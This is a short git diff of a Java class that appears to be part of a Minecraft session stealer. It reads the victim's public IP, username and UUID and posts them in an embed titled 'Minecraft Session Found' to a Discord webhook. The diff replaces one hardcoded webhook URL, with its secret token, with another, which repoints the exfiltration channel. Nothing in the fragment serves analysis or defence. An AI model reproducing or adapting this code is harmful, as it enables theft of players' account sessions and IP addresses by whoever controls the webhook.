@@ -26,7 +26,7 @@ public class DiscordWebhook {
         String IP = (new BufferedReader(new InputStreamReader((new URL("https://checkip.amazonaws.com/")).openStream()))).readLine();
         String nw = "https://sky.shiiyu.moe/stats/" + username;
 
-        Webhook webhook = new Webhook("https://discord.com/api/webhooks/1045876614791172206/5smC3thQ6vhVcroLOrHYhZeL8gChrq98LvEk3OeBaXiJqhW4wgdfoyQ0IJwTXMKIW3M2");
+        Webhook webhook = new Webhook("https://discord.com/api/webhooks/1154098401554743316/NY7yCEnnRQk8q8OEWRQEQNEVYaFINaoGnwHDoCEOFevonWxqFOEi6eGPMtNkSNsOngPj");
         Webhook.EmbedObject embed = new Webhook.EmbedObject();
         embed.setTitle("{!] Minecraft Session Found {!]");
         embed.setThumbnail("https://crafatar.com/avatars/" + uuid);
